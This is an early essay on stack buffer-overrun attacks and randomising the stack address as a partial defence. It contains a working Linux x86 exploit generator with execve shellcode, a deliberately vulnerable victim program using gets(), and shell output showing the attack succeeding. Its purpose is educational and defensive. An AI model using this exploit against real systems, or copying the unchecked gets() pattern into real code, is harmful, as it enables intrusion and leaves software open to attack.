@@ -1,0 +1,223 @@
+
+
+              Protecting Against Some Buffer-Overrun Attacks
+                                   
+	       Richard Kettlewell <rjk@greenend.org.uk>
+
+                              1998-08-04
+
+1. Buffer-Overrun Attacks
+
+C programs are prone to a particular class of security hole known as
+buffer overruns.  They are always due to a programming error, but it
+is a very common one.
+
+The problem arises when a program reads a string from an untrusted
+source (for example, someone accessing the target system via the
+Internet) into a fixed-sized buffer allocated on the stack, without
+checking that the string is no larger than the buffer provided.
+
+An attacker can choose their input carefully, so it overwrites the
+saved return address on the stack.  Typically they also load some
+machine code into the buffer that they are overrunning at the same
+time, and choose the value that they replace the return address with
+so that this code will be executed.  (This is not the only
+possibility.)
+
+The code can do anything they like, but often it will do whatever is
+required to get a shell login to the system under attack.  Since many
+daemons run as root this can be particularly serious.
+
+2. An Example Attack
+
+Below is a program that will construct an attack for Linux 80x86
+systems.  It assumes that the buffer to be overflowed is 1024 bytes
+long, and requires you to determine what the address of the buffer in
+the target program will be.
+
+Systems with different stack layouts will require some modification to
+this program.
+
+This is often quite easy - usually the attacker will have access to a
+system similar or identical to the one they are attacking, and
+programs such as GDB can be used to determine runtime addresses of
+variables.
+
+    #include <stdio.h>
+
+    #define BUFFER 0xbffff7c0
+
+    #define ATTACK_IN_TARGET ((struct bomb *)BUFFER)
+
+    struct bomb {
+        char code[1024];
+        char *link;
+        char *retvalue;
+        char *table[3];
+        char echo[16];
+        char message[64];
+    } attack = {
+        "\xb8\x0b\0\0\0" /* movl $0x0b,%eax (execve) */
+        "\xbb\0\0\0\0"   /* movl $0,%ebx (program) */
+        "\xb9\0\0\0\0"   /* movl $0,%ecx (table) */
+        "\xba\0\0\0\0"   /* movl $0,%edx (environment) */
+        "\xcd\x80",      /* int $0x80 (linux system call interface) */
+
+        NULL,            /* saved ebp */
+        (char *)BUFFER,  /* saved eip */
+        {ATTACK_IN_TARGET->echo,
+         ATTACK_IN_TARGET->message,
+         NULL},          /* argument table for execve */
+        "/bin/echo",
+        "hacker wins!"
+    };
+
+    main() {
+        *(char **)(attack.code + 6) = ATTACK_IN_TARGET->echo;
+        *(char ***)(attack.code + 11) = ATTACK_IN_TARGET->table;
+        fwrite((void *)&attack, 1, sizeof attack, stdout);
+    }
+
+This produces about a kilobyte of output which can be used to attack
+the target program and cause it to execute /bin/echo with the argument
+"hacker wins"!.  It's not very polished, but we're not after style
+points here.
+
+(A real exploit might e.g. execute /bin/sh.)
+
+3. An Example Victim
+
+Here is an example victim program.  It's particularly cooperative as
+it displays the necessary buffer address on its standard output!
+(Finding the same piece of information for real programs is left as an
+exercise for the reader.)
+
+    main() {
+        char buffer[1024];
+
+        printf("buffer=%p\n", buffer);
+        gets(buffer);           /* insecure! */
+        return 0;
+    }
+
+We compile it up and ask it the runtime buffer address:
+
+    : sfere; cc -o victim0 victim0.c
+    /tmp/cca324671.o: In function `main':
+    /tmp/cca324671.o(.text+0x25): the `gets' function is dangerous and should not be used.
+    : sfere; ./victim0 </dev/null
+    buffer=0xbffff7e0
+
+(Note that the linker helpfully warns us we're doing something
+dangerous.  Neat!)
+
+We edit the above exploit accordingly and generate the attack string:
+
+    : sfere; cp exploit.c exploit0.c
+    : sfere; vi exploit0.c
+    : sfere; cc -o exploit0 exploit0.c 
+    : sfere; ./exploit0 >exploit0.bin 
+
+Now we can make the victim program execute our chosen bit of code:
+
+    : sfere; ./victim0 <exploit0.bin
+    buffer=0xbffff7e0
+    hacker wins!
+
+4. A Partial Solution
+
+This attack technique relies on knowing what address the target buffer 
+is at in order to work.  Obviously it's not the only possible attack,
+but it is a common one.  If we can deny the attack this knowledge, we
+can gain ourselves a little more time to fix the bugs properly.
+
+One way to do this is to make the stack appear at a different address
+every time the program runs.  Here's our victim program modified to do 
+this - it allocates a random amount of space on the stack before it
+does anything else.
+
+    #include <unistd.h>
+    #include <fcntl.h>
+    #include <stdlib.h>
+
+    real_main() {
+        char buffer[1024];
+
+        printf("buffer=%p\n", buffer);
+        gets(buffer);           /* insecure! */
+        return 0;
+    }
+
+    main() {
+        if(getenv("RANDOM_STACK")) {
+            void *x;
+            int fd;
+            size_t n;
+            ssize_t m;
+            char buffer[sizeof (size_t)];
+
+            fd = open("/dev/urandom", O_RDONLY);
+            read(fd, buffer, sizeof (size_t));
+            close(fd);
+            n = *(size_t *)buffer;
+            n %= atoi(getenv("RANDOM_STACK"));
+            x = alloca(n);
+        }
+        exit(real_main());
+    }
+
+/dev/urandom is probably Linux-specific, but this is only a proof of
+concept.  alloca() isn't defined by the ANSI C standard, but it's an
+easy way of achieving the effect I want here.
+
+We compile everything up.
+
+    : sfere; cc -o victim victim.c
+    /tmp/cca326401.o: In function `real_main':
+    /tmp/cca326401.o(.text+0x25): the `gets' function is dangerous and should not be used.
+
+Now - assuming we remember to set that environment variable - the
+buffer is at a different address every time!
+
+    : sfere; RANDOM_STACK=4096 ./victim </dev/null
+    buffer=0xbfffee84
+    : sfere; RANDOM_STACK=4096 ./victim </dev/null
+    buffer=0xbffff058
+    : sfere; RANDOM_STACK=4096 ./victim </dev/null
+    buffer=0xbfffedf8
+    : sfere; RANDOM_STACK=4096 ./victim </dev/null
+    buffer=0xbfffea48
+    : sfere; 
+
+Now whatever value we put into exploit.c, our exploit.bin will almost
+always cause a segfault - not the invocation of /bin/echo.  (Actually
+with a RANDOM_STACK value of 4096 the hacker will win in a few
+thousand tries - so you'd better choose a bigger value in real life.)
+
+    : sfere; RANDOM_STACK=4096 ./victim <exploit.bin 
+    buffer=0xbfffedb8
+    zsh: segmentation fault (core dumped)  RANDOM_STACK=4096 ./victim < exploit.bin
+    : sfere; RANDOM_STACK=4096 ./victim <exploit.bin
+    buffer=0xbfffed08
+    zsh: segmentation fault (core dumped)  RANDOM_STACK=4096 ./victim < exploit.bin
+
+5. Extending The Idea
+
+Obviously if you're in a position to modifiy main() as above, then
+you're half way to being able to audit all your source and fix the
+bugs properly anyway.  But for many programs you don't have source,
+and right now you may not have the time to check them all.  So, if you
+can modify your operating system kernel, or perhaps your libc startup
+code, you may be able to incorporate the above ideas.
+
+Another kind of attack involves overwriting the return address with
+e.g. the address of system() in libc, or some other useful function.
+We can reduce the impact of these in a similar way by loading shared
+libraries and the program itself at random addresses - how practical
+this is will vary from system to system.
+
+6. Caveat
+
+Don't treat this as a panacea; someone may come up with a way around
+this, and there are many other kinds of security bugs.
+    
